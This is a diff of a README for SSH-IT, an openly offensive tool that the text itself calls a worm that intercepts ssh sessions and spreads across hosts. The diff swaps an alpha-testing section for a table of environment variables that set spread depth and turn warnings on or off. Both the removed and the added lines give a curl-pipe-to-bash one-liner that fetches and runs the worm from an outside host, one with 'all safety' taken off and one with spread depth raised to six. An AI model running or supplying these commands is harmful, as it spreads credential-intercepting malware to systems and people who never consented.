@@ -28,25 +28,19 @@ To uninstall use:
 ~/.prng/thc_cli -r uninstall
 ```
 
-### ALPHA TESTING
+### Environment variables:
 
-This is PRE-RELEASE ALPHA STAGE for TESTING only.
+Deployment can be controlled with these environment variables
 
-Verbose mode (```THC_VERBOSE=1```) is enabled by default. The worm will stop after 2 hops (```THC_DEPTH=2```).
+|:---|:---|
+|```THC_DEPTH=```|SSH-IT will spread to this depth and then stop. The default is ```THC_DEPTH=2```.|
+|```THC_VERBOSE=1```|For testing only: Display a warning to the user when *ssh* is being intercepted (in bold red).|
+|```THC_DEBUG=1```|For testing only: Display debug information|
+|```THC_DEBUG_LOG=thc.log```|For testing only: Output (most) debug informatio to ```thc.log```.|
 
-SETTINGS:
-* ```THC_VERBOSE=1``` Display a warning when *ssh* is being intercepted (in bold red).
-* ```THC_DEPTH=2``` The worm will not spread further than 2 hops away from the current host.
-* ```THC_DEBUG=1``` Display debug information.
-* ```THC_DEBUG_LOG=thc.log``` Output (most) debug information to ```thc.log```.
-
-{:refdef: style="text-align: center;"}
-![Verbose-Example](verbose-example.png)
-{: refdef}
-
-Take off all safety and run SSH-IT in release mode (*with no warnings*):
+Example
 ```shell
-THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+THC_DEPTH=6 THC_DEBUG=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
 ### Tips & Tricks
